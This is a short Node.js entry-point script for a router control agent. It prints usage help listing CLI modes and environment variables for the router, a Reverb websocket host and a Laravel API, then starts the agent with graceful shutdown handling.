async function main() {
  const args = process.argv.slice(2);

  if (args.includes('--help') || args.includes('-h')) {
    console.log(`
Router Control Agent — Enhanced Version

Usage:
  node agent.js              Start the agent
  node agent.js --monitor    Monitor mode (read-only)
  node agent.js --restart    Restart pending operations
  node agent.js --help       Show this help

Environment Variables:
  ROUTER_IP          Router IP address (default: 192.168.1.1)
  ROUTER_USER        Router username (default: admin)
  ROUTER_PASS        Router password (default: Admin1234)
  REVERB_HOST        Reverb host (default: localhost)
  REVERB_PORT        Reverb port (default: 8080)
  LARAVEL_API_URL    Laravel API URL (default: http://localhost:8000/api)
  LARAVEL_API_TOKEN  Laravel API token
    `);
    return;
  }

  const agent = new Agent();

  // Graceful shutdown
  const shutdown = async () => {
    await agent.stop();
    process.exit(0);
  };

  process.on('SIGINT', shutdown);
  process.on('SIGTERM', shutdown);

  try {
    await agent.start();
  } catch (err) {
    console.error('[agent] Failed to start:', err);
    process.exit(1);
  }
}

main();
